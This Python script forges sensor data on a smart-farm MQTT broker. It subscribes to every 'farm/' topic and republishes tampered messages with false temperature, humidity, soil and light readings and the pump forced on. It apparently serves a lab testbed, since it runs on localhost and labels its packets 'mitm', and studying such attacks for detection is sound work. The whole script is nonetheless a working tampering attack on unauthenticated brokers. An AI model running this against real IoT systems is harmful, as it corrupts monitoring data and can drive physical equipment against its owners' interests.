import json
import threading
import time
from paho.mqtt import client as mqtt_client

BROKER = "localhost"
PORT = 1883

client = mqtt_client.Client(
    mqtt_client.CallbackAPIVersion.VERSION2,
    client_id="mitm-attacker"
)

client.connect(BROKER, PORT)
client.loop_start()

running = False

def tamper_payload(topic, data):
    tampered = data.copy()

    if topic == "farm/temperature":
        tampered["temperature"] = 52.0

    elif topic == "farm/humidity":
        tampered["humidity"] = 15

    elif topic == "farm/soil":
        tampered["soil_moisture"] = 98

    elif topic == "farm/light":
        tampered["light_intensity"] = 999

    elif topic == "farm/pump":
        tampered["pump_status"] = "ON"

    tampered["device"] = "mitm-attacker"
    tampered["packet_type"] = "mitm"

    return tampered

def on_message(client, userdata, msg):
    if not running:
        return

    try:
        data = json.loads(msg.payload.decode())

        if data.get("packet_type") != "normal":
            return

        tampered = tamper_payload(msg.topic, data)
        tampered["timestamp"] = time.time()

        client.publish(msg.topic, json.dumps(tampered))
        print(f"🟣 MITM [{msg.topic}] -> {tampered}")

    except Exception:
        pass

client.subscribe("farm/#")
client.on_message = on_message

def start_mitm_attack():
    global running
    running = True

def stop_mitm_attack():
    global running
    running = False